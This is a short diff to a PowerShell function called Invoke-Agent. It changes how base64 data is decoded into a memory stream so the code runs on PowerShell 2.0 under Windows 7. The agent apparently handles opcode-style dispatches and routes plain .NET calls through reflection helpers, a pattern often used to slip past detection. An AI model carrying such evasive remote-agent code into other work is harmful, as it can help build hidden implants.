@@ -179,10 +179,13 @@ function Invoke-Agent {
         # wrapped on PS 2.0 — the CLR2 binder refused it ("FromBase64String not found", Win7
         # field 2026-09-23, first real 0x0B dispatch). Same rule as WebRequest.Create.
         $raw = CallStatic (ResolveM 'System.Convert') 'FromBase64String' @([string]$base64)
-        $ms = New-Object 'IO.MemoryStream'
-        $null = CallInst $ms 'Write' @([byte[]]$raw, 0, $raw.Length)
-        SetProp $ms 'Position' 0
-        return $ms
+        # Ctor-seeded stream — NO Write, NO Position set. The CLR2 binder refused
+        # InvokeMember('Position', SetProperty) on MemoryStream even with a literal int
+        # ("Position not found", Win7 field 2026-09-23) while the same SetProp shape binds
+        # HttpWebRequest's Int64s — mechanism unclear, so the call is GONE, not patched:
+        # a fresh buffer-backed stream is already at Position 0, and New-Object's own
+        # binder takes the [byte[]] argument.
+        return (New-Object 'IO.MemoryStream' (,[byte[]]$raw))
     }
     $GuidRe = '^[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}$'
     function LoadGuid {
